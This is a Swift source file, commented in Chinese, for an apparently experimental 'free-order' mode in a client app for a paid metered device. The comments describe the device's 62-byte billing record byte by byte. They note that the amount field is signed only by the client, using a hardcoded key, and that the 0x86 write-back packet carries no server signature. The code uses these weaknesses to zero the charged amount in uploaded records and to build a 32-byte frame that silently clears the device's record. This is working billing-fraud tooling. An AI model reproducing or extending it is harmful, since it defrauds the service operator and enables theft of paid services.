import Foundation

/// 免单模式（实验）。
///
/// ## 为什么能成立
///
/// 62 字节设备记录里 **`[28:32]` 就是消费金额（分，大端）**，而这条记录由客户端
/// 上传、签名者是客户端自己（外层密钥硬编码在 `Signer`，`loginCode` 在进程内可读）；
/// `0x86` 写回包是一段**没有服务端签名**的 32 字节明文，服务端只是把设备尾字节
/// 原样搬回去。所以"改金额"和"清记录"这两件事都在客户端手上。
///
/// 布局已用真机日志逐字节对齐（2026-11-15 22:02:55 那单）：
/// ```
/// 62B 记录: 80 | 时间(6) | 00 00 | 035B | 0000012C | 000027A7 | 02 00 00 00
///           | 02 00 00 13 88 | 金额(4) | 23 | MAC(6) | 明细 | 尾(5)
/// 32B 写回: 记录[1:7] 记录[7:11] 记录[11:15] 记录[15:19] 记录[20:24]
///           金额(4) 00 记录[57:62]
/// ```
enum BypassMode: String, CaseIterable, Identifiable {
    case off
    case zeroUpload
    case silentClear

    var id: String { rawValue }

    var title: String {
        switch self {
        case .off: return "关闭（正常计费）"
        case .zeroUpload: return "改金额上传（被拒自动清零）"
        case .silentClear: return "只清设备记录（不上传）"
        }
    }

    /// 日志页胶囊按钮用的短名
    var shortTitle: String {
        switch self {
        case .off: return "关"
        case .zeroUpload: return "改金额"
        case .silentClear: return "只清零"
        }
    }
}

enum BypassSettings {
    private static let key = "linyu.billingBypassMode"

    static var mode: BypassMode {
        get { BypassMode(rawValue: UserDefaults.standard.string(forKey: key) ?? "") ?? .off }
        set { UserDefaults.standard.set(newValue.rawValue, forKey: key) }
    }
}

enum BypassRecord {
    /// 62 字节记录里消费金额（分，大端）的位置
    static let amountRange = 28 ..< 32

    /// 把金额改成 0 —— 用于伪造 upload 的 `xfData`
    static func zeroed(_ record: [UInt8]) -> [UInt8] {
        guard record.count >= 32 else { return record }
        var out = record
        for i in amountRange { out[i] = 0 }
        return out
    }

    /// 32 字节 `0x86` 写回包：与真机帧逐字节对齐，金额固定为 0。
    static func writeBack(for record: [UInt8]) -> [UInt8]? {
        guard record.count >= 62 else { return nil }
        var out = [UInt8]()
        out += record[1 ..< 7]      // 记录时间
        out += record[7 ..< 11]     // projectId
        out += record[11 ..< 15]    // deviceId
        out += record[15 ..< 19]    // accountId
        out += record[20 ..< 24]    // 类型
        out += [0, 0, 0, 0]         // 金额 = 0
        out.append(0)
        out += record[57 ..< 62]    // 设备尾字节（原样）
        return out.count == 32 ? out : nil
    }
}
